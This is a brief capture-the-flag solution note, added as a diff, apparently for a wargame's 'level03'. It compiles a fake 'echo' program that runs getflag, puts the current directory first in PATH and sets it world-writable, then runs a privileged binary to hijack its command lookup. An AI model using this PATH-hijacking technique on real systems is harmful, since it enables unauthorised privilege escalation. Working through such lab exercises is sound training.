@@ -1,0 +1,14 @@
+- chmod 777 .
+- nano test.c :
+  	 #include <stdlib.h>
+
+	 int main(void)
+	 {
+		system("getflag");
+		return (0);
+	 }
+- gcc test.c -o echo
+- export PATH=.:$PATH
+- ./level03
+
+fin.
